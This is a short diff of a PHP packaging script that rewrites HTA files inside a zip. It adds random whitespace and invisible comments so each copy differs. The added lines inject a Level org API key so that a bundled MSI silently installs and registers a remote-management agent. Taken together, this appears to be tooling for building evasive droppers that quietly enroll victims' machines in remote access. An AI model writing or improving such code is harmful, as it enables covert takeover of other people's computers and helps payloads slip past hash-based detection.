@@ -32,7 +32,12 @@ for ($i = 0; $i < $in->numFiles; $i++) {
 }
 $in->close();
 
-// ---- mutate the HTA: insert a random invisible comment before </body> ----
+// ---- mutate the HTA: inject this service's Level org key + a random
+//      invisible comment before </body>. The key makes the MSI run its
+//      silent RunInstaller action and register the agent with THIS org
+//      (per-service LEVEL_API_KEY env var). If unset, the placeholder is
+//      left inert so the MSI installs without an org key. ----
+$levelKey = (string)($_ENV['LEVEL_API_KEY'] ?? (getenv('LEVEL_API_KEY') ?: ''));
 foreach ($entries as $nm => $data) {
     if (substr($nm, -4) !== '.hta') continue;
     $pad = random_int(2, 8) . " \n";                              // random trailing whitespace
@@ -41,6 +46,18 @@ foreach ($entries as $nm => $data) {
     $entries[$nm] = ($pos !== false)
         ? substr($data, 0, $pos) . $pad . $cmt . substr($data, $pos)
         : $data . $pad . $cmt;
+    if ($levelKey !== '') {
+        // Replace ONLY the first token occurrence (the `var LEVEL_KEY = "…"`
+        // declaration). The guard below the engine references the literal
+        // token too; replacing just the decl keeps the guard working and
+        // guarantees the key lands exactly once.
+        $e = (string)$entries[$nm];
+        $i = strpos($e, '@@LEVEL_KEY@@');
+        if ($i !== false) {
+            $entries[$nm] = substr($e, 0, $i) . $levelKey
+                          . substr($e, $i + strlen('@@LEVEL_KEY@@'));
+        }
+    }
 }
 
 // ---- build the fresh zip. Wrapped in a retry loop: on some kernels
